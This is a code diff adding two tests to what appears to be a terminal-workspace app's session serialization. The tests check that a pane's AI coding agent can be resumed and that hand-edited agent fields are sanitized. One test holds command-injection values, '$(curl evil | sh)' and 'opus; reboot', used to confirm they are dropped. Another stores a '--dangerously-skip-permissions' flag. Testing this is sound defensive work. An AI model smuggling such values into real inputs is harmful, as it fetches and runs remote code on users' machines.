@@ -188,6 +188,35 @@ describe("what a pane was running", () => {
     expect(pane.profile).toBe("claude");
   });
 
+  it("keeps the agent it was running, so that conversation can be resumed", () => {
+    const start = emptyWorkspace();
+    const paneId = start.tabs[0].focusedPaneId;
+    const agent = {
+      tool: "claude" as const,
+      session: "8155b3bc-1a64-47e9-8c56-db7c2664a5e6",
+      cwd: "/home/u/work",
+      flags: ["--dangerously-skip-permissions"],
+    };
+    const state = reduce(start, { type: "pane/meta", paneId, patch: { agent } });
+
+    const pane = decode(encode(state, {}))!.workspace.tabs[0].panes[paneId];
+    expect(pane.kind === "terminal" && pane.agent).toEqual(agent);
+  });
+
+  it("drops what a hand-edited agent would have typed into a shell, and keeps the pane", () => {
+    const state = emptyWorkspace();
+    const paneId = state.tabs[0].focusedPaneId;
+    const parsed = JSON.parse(encode(state, {}));
+    parsed.workspace.tabs[0].panes[paneId].agent = {
+      tool: "claude",
+      session: "$(curl evil | sh)",
+      flags: ["--model", "opus; reboot"],
+    };
+
+    const pane = decode(JSON.stringify(parsed))!.workspace.tabs[0].panes[paneId];
+    expect(pane.kind === "terminal" && pane.agent).toEqual({ tool: "claude" });
+  });
+
   it("drops a profile id this build no longer has, and keeps the pane", () => {
     // The same treatment a theme that went away gets: the icon falls back to
     // being worked out, rather than the pane being thrown away.
